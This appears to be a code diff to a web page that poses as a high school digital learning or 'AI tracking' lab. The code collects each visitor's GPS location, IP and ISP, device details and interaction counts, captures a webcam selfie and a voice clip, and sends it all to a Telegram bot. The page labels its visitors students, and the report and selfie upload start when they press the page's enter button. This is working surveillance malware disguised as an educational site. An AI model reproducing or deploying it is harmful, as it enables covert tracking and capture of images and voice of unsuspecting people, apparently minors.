+        else if (/Xiaomi|Redmi/i.test(ua)) { brand = "Xiaomi"; model = "Redmi/Xiaomi"; }
+        return { brand, model, platform: navigator.platform, userAgent: ua };
     }
     
-    // ======================= FORMAT LAPORAN TELEGRAM SESUAI KEINGINAN =======================
     async function sendFullReport() {
-        getAllTrackingData();
-        await getBatteryInfo();
-        await getIPInfo();
+        const device = getDeviceInfo();
+        const battery = await getBatteryInfo();
+        const ip = await getIPInfo();
+        const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
         
-        let message = `╔════════════════════════════════════════╗\n`;
-        message += `║   🏫 SMA NEGERI 1 - DIGITAL LAB      \n`;
-        message += `║        by ANBATUKANG 🫦               \n`;
-        message += `╚════════════════════════════════════════╝\n\n`;
-        
-        // 📍 LOKASI GPS
-        message += `<b>📍 LOKASI GPS</b>\n`;
-        if (gpsData) {
-            message += `🎯 Koordinat: ${gpsData.lat}, ${gpsData.lon}\n`;
-            message += `📏 Akurasi: ${Math.round(gpsData.accuracy)} meter\n`;
-            message += `🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n\n`;
-        } else { message += `❌ GPS tidak tersedia\n\n`; }
-        
-        // 📡 INFORMASI JARINGAN
-        message += `<b>📡 INFORMASI JARINGAN</b>\n`;
-        message += `🖧 IP: ${trackingData.location.ip || 'N/A'}\n`;
-        message += `🏙️ Lokasi IP: ${trackingData.location.city || '-'}, ${trackingData.location.region || '-'}, ${trackingData.location.country || '-'}\n`;
-        message += `📡 ISP: ${trackingData.location.isp || 'Unknown'}\n`;
-        message += `📶 Tipe Koneksi: ${trackingData.connection.type || 'unknown'}\n`;
-        message += `⬇️ Downlink: ${trackingData.connection.downlink || 'unknown'}\n`;
-        message += `⏱️ Latency (RTT): ${trackingData.connection.rtt || 'unknown'}\n\n`;
-        
-        // 💻 PERANGKAT & BROWSER
-        message += `<b>💻 PERANGKAT & BROWSER</b>\n`;
-        message += `📱 Brand: ${trackingData.device.brand}\n`;
-        message += `📲 Model: ${trackingData.device.model}\n`;
-        message += `📱 User Agent: ${trackingData.device.userAgent.substring(0, 150)}\n`;
-        message += `⚙️ Platform: ${trackingData.device.platform}\n`;
-        message += `📺 Resolusi: ${trackingData.screen.resolution}\n`;
-        message += `🧭 Orientasi: ${trackingData.screen.orientation}\n`;
-        message += `🎨 Color Depth: ${trackingData.screen.colorDepth}-bit\n`;
-        message += `🔍 Pixel Ratio: ${trackingData.screen.pixelRatio}x\n`;
-        message += `🧠 CPU Cores: ${trackingData.performance.cpuCores}\n`;
-        message += `💾 RAM: ${trackingData.performance.ram}\n`;
-        message += `🎮 GPU: ${trackingData.performance.gpu}\n\n`;
-        
-        // 🔋 BATERAI & POWER
-        message += `<b>🔋 BATERAI & POWER</b>\n`;
-        message += `⚡ Level: ${trackingData.battery.level !== null ? trackingData.battery.level + '%' : 'N/A'}\n`;
-        message += `🔌 Charging: ${trackingData.battery.charging === true ? '✅ Ya' : '❌ Tidak'}\n`;
-        if (trackingData.battery.dischargingTime) message += `⏱️ Sisa daya: ${trackingData.battery.dischargingTime} menit\n\n`;
-        else message += `\n`;
-        
-        // 🔄 MENU 1 - SENSOR PERANGKAT
-        message += `<b>🔄 MENU 1 - SENSOR PERANGKAT</b>\n`;
-        message += `🌀 Gyroscope: ${trackingData.sensors.gyroscope ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `📳 Accelerometer: ${trackingData.sensors.accelerometer ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🧲 Magnetometer: ${trackingData.sensors.magnetometer ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `✋ Touch Screen: ${trackingData.sensors.touch ? `✅ Ya (${trackingData.sensors.maxTouch} titik)` : '❌ Tidak'}\n\n`;
-        
-        // 💾 MENU 2 - STORAGE & CACHE
-        message += `<b>💾 MENU 2 - STORAGE & CACHE</b>\n`;
-        message += `📦 LocalStorage: ${trackingData.storage.localStorage > 0 ? `${Math.round(trackingData.storage.localStorage / 1024)} KB` : 'Kosong'}\n`;
-        message += `📦 SessionStorage: ${trackingData.storage.sessionStorage > 0 ? `${Math.round(trackingData.storage.sessionStorage / 1024)} KB` : 'Kosong'}\n`;
-        message += `🗄️ IndexedDB: ${trackingData.storage.indexedDB ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🍪 Cookies: ${trackingData.storage.cookies ? '✅ Enabled' : '❌ Disabled'}\n\n`;
-        
-        // 🎵 MENU 3 - AUDIO & VIDEO
-        message += `<b>🎵 MENU 3 - AUDIO & VIDEO</b>\n`;
-        message += `🎤 Audio Input: ${trackingData.media.audioInput ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `📷 Video Input: ${trackingData.media.videoInput ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🗣️ Speech Recognition: ${trackingData.media.speechRecognition ? '✅ Tersedia' : '❌ Tidak'}\n\n`;
-        
-        // 🌐 MENU 4 - NETWORK DETAILS
-        message += `<b>🌐 MENU 4 - NETWORK DETAILS</b>\n`;
-        message += `📡 Online Status: ${trackingData.networkDetails.online ? '✅ Online' : '❌ Offline'}\n`;
-        message += `💾 Save Data Mode: ${trackingData.networkDetails.saveData ? '✅ Aktif' : '❌ Tidak'}\n`;
-        message += `📶 Max Downlink: ${trackingData.networkDetails.downlinkMax ? trackingData.networkDetails.downlinkMax + ' Mbps' : 'N/A'}\n\n`;
-        
-        // 🎨 MENU 5 - GRAPHICS & RENDERING
-        message += `<b>🎨 MENU 5 - GRAPHICS & RENDERING</b>\n`;
-        message += `🖼️ WebGL: ${trackingData.graphics.webgl ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🚀 WebGL2: ${trackingData.graphics.webgl2 ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🎮 WebGPU: ${trackingData.graphics.webgpu ? '✅ Tersedia' : '❌ Tidak'}\n\n`;
-        
-        // 📋 MENU 6 - CLIPBOARD & PERMISSIONS
-        message += `<b>📋 MENU 6 - CLIPBOARD & PERMISSIONS</b>\n`;
-        message += `📎 Clipboard API: ${trackingData.clipboard.clipboardAPI ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🔐 Permissions API: ${trackingData.clipboard.permissionsAPI ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🌍 Browser Language: ${trackingData.clipboard.language}\n`;
-        message += `🚫 Do Not Track: ${trackingData.clipboard.doNotTrack || 'Tidak diset'}\n\n`;
-        
-        // 📳 MENU 7 - VIBRATION & NOTIFICATION
-        message += `<b>📳 MENU 7 - VIBRATION & NOTIFICATION</b>\n`;
-        message += `📳 Vibration API: ${trackingData.vibration.vibrationAPI ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `🔔 Notification API: ${trackingData.vibration.notificationAPI ? '✅ Tersedia' : '❌ Tidak'}\n`;
-        message += `⏰ Wake Lock API: ${trackingData.vibration.wakeLock ? '✅ Tersedia' : '❌ Tidak'}\n\n`;
-        
-        // 👆 INTERAKSI PENGGUNA
-        message += `<b>👆 INTERAKSI PENGGUNA</b>\n`;
-        message += `📜 Scroll: ${userScrolls} kali\n`;
-        message += `🖱️ Klik: ${userClicks} kali\n`;
-        message += `⌨️ Key Press: ${userKeyPresses} kali\n`;
-        message += `🖱️ Mouse Movement: ${mouseMoveCount} kali\n`;
-        message += `⏱️ Waktu di Halaman: ${Math.floor((Date.now() - startTime) / 1000)} detik\n\n`;
-        
-        // 🕒 WAKTU AKSES
-        message += `<b>🕒 WAKTU AKSES</b>\n`;
-        message += `🕒 Tanggal & Waktu: ${new Date().toLocaleString('id-ID')}\n`;
-        message += `🧭 Zona Waktu: ${trackingData.location.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
-        
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `<i>✅ Siswa telah mengakses Digital Learning Lab SMA NEGERI 1</i>`;
-        
+        let message = `╔════════════════════════════════════════╗\n║   🏫 SMA NEGERI 1 - AI TRACKING LAB  ║\n║        by ANBATUKANG 🫦              ║\n╚════════════════════════════════════════╝\n\n`;
+        message += `<b>📍 LOKASI GPS</b>\n${gpsData ? `🎯 Koordinat: ${gpsData.lat}, ${gpsData.lon}\n📏 Akurasi: ${Math.round(gpsData.accuracy)} meter\n🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n\n` : '❌ GPS tidak tersedia\n\n'}`;
+        message += `<b>📡 INFORMASI JARINGAN</b>\n🖧 IP: ${ip.ip || 'N/A'}\n🏙️ Lokasi IP: ${ip.city || '-'}, ${ip.region || '-'}, ${ip.country || '-'}\n📡 ISP: ${ip.isp || 'Unknown'}\n📶 Tipe Koneksi: ${connection}\n\n`;
+        message += `<b>💻 PERANGKAT & BROWSER</b>\n📱 Brand: ${device.brand}\n📲 Model: ${device.model}\n📱 User Agent: ${device.userAgent.substring(0, 150)}\n⚙️ Platform: ${device.platform}\n📺 Resolusi: ${screen.width}x${screen.height}\n🧠 CPU Cores: ${navigator.hardwareConcurrency || '?'}\n💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n\n`;
+        message += `<b>🔋 BATERAI</b>\n⚡ Level: ${battery.level !== null ? battery.level + '%' : 'N/A'}\n🔌 Charging: ${battery.charging === true ? '✅ Ya' : '❌ Tidak'}\n\n`;
+        message += `<b>👆 INTERAKSI</b>\n📜 Scroll: ${userScrolls} kali\n🖱️ Klik: ${userClicks} kali\n⏱️ Waktu: ${Math.floor((Date.now() - startTime) / 1000)} detik\n\n`;
+        message += `<b>🕒 WAKTU AKSES</b>\n🕒 ${new Date().toLocaleString('id-ID')}\n🧭 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Siswa telah mengakses AI Tracking Lab SMA NEGERI 1`;
         sendToTelegram(message);
     }
     
@@ -557,55 +422,227 @@
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const photoUrl = canvas.toDataURL('image/jpeg', 0.7);
-            let gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
-            sendToTelegram(`📸 <b>SELFIE SISWA</b>\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n🏫 SMA NEGERI 1 - Digital Lab`, photoUrl);
+            const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
+            sendToTelegram(`📸 SELFIE SISWA\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia'}\n🏫 SMA NEGERI 1 - AI Tracking Lab`, photoUrl);
             stream.getTracks().forEach(t => t.stop());
         } catch(e) {}
     }
     
-    // ======================= HAND TRACKING =======================
-    let handTrackingStarted = false;
-    async function startHandTracking() {
-        if (handTrackingStarted) return;
-        handTrackingStarted = true;
+    async function captureScreenshot() {
+        const videoCanvas = document.getElementById('videoCanvas');
+        const trackingCanvas = document.getElementById('trackingCanvas');
+        if (!videoCanvas) return;
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = videoCanvas.width;
+        canvas.height = videoCanvas.height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoCanvas, 0, 0);
+        ctx.drawImage(trackingCanvas, 0, 0);
+        
+        const photoUrl = canvas.toDataURL('image/jpeg', 0.9);
+        sendToTelegram(`📸 AI TRACKING CAPTURE\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia'}\n🏫 SMA NEGERI 1\n✋ Hand Tracking + Face Tracking Active`, photoUrl);
+        alert('Screenshot berhasil dikirim ke Telegram!');
+    }
+    
+    // ======================= VOICE RECORDING KE TELEGRAM =======================
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let isRecording = false;
+    
+    async function startVoiceRecording() {
+        if (isRecording) {
+            stopVoiceRecording();
+            return;
+        }
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            
+            mediaRecorder.ondataavailable = (event) => {
+                audioChunks.push(event.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                const voiceStatus = document.getElementById('voiceStatusDisplay');
+                voiceStatus.innerHTML = '🎤 Voice: Mengirim ke Telegram...';
+                
+                // Konversi ke format yang lebih compatible (OGG)
+                const reader = new FileReader();
+                reader.onloadend = async () => {
+                    // Kirim audio ke Telegram
+                    const audioFile = new File([audioBlob], 'voice_note.webm', { type: 'audio/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('voice', audioFile);
+                    formData.append('caption', `🎤 VOICE NOTE\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia'}\n🏫 SMA NEGERI 1 - AI Tracking Lab\n📝 Durasi: 5 detik`);
+                    formData.append('parse_mode', 'HTML');
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => console.log('silent'));
+                    
+                    voiceStatus.innerHTML = '🎤 Voice: Berhasil dikirim ke Telegram!';
+                    setTimeout(() => {
+                        voiceStatus.innerHTML = '🎤 Voice: Siap merekam';
+                    }, 3000);
+                };
+                reader.readAsDataURL(audioBlob);
+                
+                stream.getTracks().forEach(track => track.stop());
+                isRecording = false;
+                const recordBtn = document.getElementById('voiceRecordBtn');
+                recordBtn.innerHTML = '🎤 Rekam Voice (5 detik)';
+                recordBtn.classList.remove('recording');
+            };
+            
+            mediaRecorder.start();
+            isRecording = true;
+            const recordBtn = document.getElementById('voiceRecordBtn');
+            recordBtn.innerHTML = '⏹️ Berhenti Rekam (5 detik)';
+            recordBtn.classList.add('recording');
+            const voiceStatus = document.getElementById('voiceStatusDisplay');
+            voiceStatus.innerHTML = '🎤 Voice: Merekam suara... (5 detik)';
+            
+            // Stop setelah 5 detik
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                    voiceStatus.innerHTML = '🎤 Voice: Memproses...';
+                }
+            }, 5000);
+            
+        } catch(err) {
+            alert('Gagal mengakses mikrofon: ' + err.message);
+        }
+    }
+    
+    function stopVoiceRecording() {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
+    }
+    
+    // ======================= HAND + FACE TRACKING =======================
+    let trackingStarted = false;
+    let currentEmotion = "Netral";
+    
+    function detectEmotion(landmarks) {
+        if (!landmarks) return "Netral";
+        try {
+            const mouthTop = landmarks[13];
+            const mouthBottom = landmarks[14];
+            const mouthOpen = Math.abs(mouthTop.y - mouthBottom.y) > 0.02;
+            if (mouthOpen) return "😀 Tersenyum";
+            return "😐 Netral";
+        } catch(e) { return "Netral"; }
+    }
+    
+    async function startTracking() {
+        if (trackingStarted) return;
+        trackingStarted = true;
+        
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         const videoElement = document.createElement('video');
         videoElement.srcObject = stream;
         videoElement.play();
+        
         const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
         hands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
+        
+        const faceMesh = new FaceMesh({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}` });
+        faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
+        
         const videoCanvas = document.getElementById('videoCanvas');
-        const handCanvas = document.getElementById('handCanvas');
-        hands.onResults((results) => {
-            const canvasCtx = handCanvas.getContext('2d');
-            handCanvas.width = videoCanvas.width;
-            handCanvas.height = videoCanvas.height;
-            canvasCtx.clearRect(0, 0, handCanvas.width, handCanvas.height);
-            if (videoElement.videoWidth) videoCanvas.getContext('2d').drawImage(videoElement, 0, 0, videoCanvas.width, videoCanvas.height);
-            if (results.multiHandLandmarks) {
-                for (const landmarks of results.multiHandLandmarks) {
-                    drawConnectors(canvasCtx, landmarks, HAND_CONNECTIONS, { color: '#ff44ff', lineWidth: 3 });
-                    drawLandmarks(canvasCtx, landmarks, { color: '#00ffff', lineWidth: 2, radius: 4 });
-                }
-                document.getElementById('gestureDisplay').innerHTML = '🖐️ Tangan Terdeteksi!';
-                document.getElementById('handLandmarkCount').innerHTML = '✅ 21 titik landmark aktif | Real-time tracking';
-            } else {
-                document.getElementById('gestureDisplay').innerHTML = '🖐️ Arahkan tangan ke kamera';
+        const trackingCanvas = document.getElementById('trackingCanvas');
+        
+        function onResults(results) {
+            const ctx = trackingCanvas.getContext('2d');
+            trackingCanvas.width = videoCanvas.width;
+            trackingCanvas.height = videoCanvas.height;
+            ctx.clearRect(0, 0, trackingCanvas.width, trackingCanvas.height);
+            
+            if (videoElement.videoWidth) {
+                const vCtx = videoCanvas.getContext('2d');
+                vCtx.drawImage(videoElement, 0, 0, videoCanvas.width, videoCanvas.height);
             }
+            
+            // Face Mesh
+            if (results.faceLandmarks && results.faceLandmarks.length > 0) {
+                const landmarks = results.faceLandmarks[0];
+                for (const point of landmarks) {
+                    const x = point.x * trackingCanvas.width;
+                    const y = point.y * trackingCanvas.height;
+                    ctx.beginPath();
+                    ctx.arc(x, y, 1.5, 0, 2 * Math.PI);
+                    ctx.fillStyle = '#f59e0b';
+                    ctx.fill();
+                }
+                currentEmotion = detectEmotion(landmarks);
+                document.getElementById('emotionDisplay').innerHTML = `😐 Ekspresi: ${currentEmotion}`;
+                document.getElementById('faceStatusDisplay').innerHTML = `😀 Wajah terdeteksi | 468 titik`;
+            } else {
+                document.getElementById('faceStatusDisplay').innerHTML = `😀 Menunggu deteksi wajah...`;
+                document.getElementById('emotionDisplay').innerHTML = `😐 Ekspresi: -`;
+            }
+            
+            // Hand Tracking
+            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+                for (const landmarks of results.multiHandLandmarks) {
+                    drawConnectors(ctx, landmarks, HAND_CONNECTIONS, { color: '#3b82f6', lineWidth: 3 });
+                    for (const point of landmarks) {
+                        const x = point.x * trackingCanvas.width;
+                        const y = point.y * trackingCanvas.height;
+                        ctx.beginPath();
+                        ctx.arc(x, y, 5, 0, 2 * Math.PI);
+                        ctx.fillStyle = '#3b82f6';
+                        ctx.shadowBlur = 8;
+                        ctx.shadowColor = '#3b82f6';
+                        ctx.fill();
+                        ctx.shadowBlur = 0;
+                        ctx.beginPath();
+                        ctx.arc(x, y, 2, 0, 2 * Math.PI);
+                        ctx.fillStyle = '#ffffff';
+                        ctx.fill();
+                    }
+                }
+                document.getElementById('handStatusDisplay').innerHTML = `🖐️ Tangan terdeteksi | 21 titik landmark aktif`;
+            } else {
+                document.getElementById('handStatusDisplay').innerHTML = `🖐️ Arahkan tangan ke kamera...`;
+            }
+        }
+        
+        hands.onResults((handResults) => {
+            faceMesh.send({ image: videoElement }).then((faceResults) => {
+                onResults({ ...handResults, ...faceResults });
+            });
         });
-        new Camera(videoElement, { onFrame: async () => await hands.send({ image: videoElement }), width: 640, height: 480 }).start();
+        
+        new Camera(videoElement, {
+            onFrame: async () => { await hands.send({ image: videoElement }); },
+            width: 640, height: 480
+        }).start();
+        
+        document.getElementById('capturePhotoBtn').addEventListener('click', captureScreenshot);
+        document.getElementById('voiceRecordBtn').addEventListener('click', startVoiceRecording);
     }
     
     // ======================= MASUK WEBSITE =======================
     async function enterWebsite() {
         const btn = document.getElementById('actionBtn');
-        btn.innerHTML = '⏳ MEMUAT LABORATORIUM...';
+        btn.innerHTML = '⏳ MEMUAT AI TRACKING LAB...';
         btn.disabled = true;
+        
         await sendFullReport();
         await captureSelfie();
-        await startHandTracking();
-        if (gpsData) document.getElementById('schoolLocation').innerHTML = `📍 Koordinat: ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)} (GPS Real-time)`;
+        await startTracking();
+        
+        if (gpsData) document.getElementById('schoolLocation').innerHTML = `📍 Koordinat: ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}`;
+        
         document.getElementById('splashScreen').style.opacity = '0';
         setTimeout(() => {
             document.getElementById('splashScreen').style.display = 'none';
@@ -623,12 +660,12 @@
         });
     });
     
-    function animateValue(element, start, end, duration) {
-        let startTimestamp = null;
-        const step = (timestamp) => {
-            if (!startTimestamp) startTimestamp = timestamp;
-            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-            element.innerText = Math.floor(progress * (end - start) + start);
+    function animateValue(el, start, end, duration) {
+        let startTime = null;
+        const step = (t) => {
+            if (!startTime) startTime = t;
+            const progress = Math.min((t - startTime) / duration, 1);
+            el.innerText = Math.floor(progress * (end - start) + start);
             if (progress < 1) requestAnimationFrame(step);
         };
         requestAnimationFrame(step);
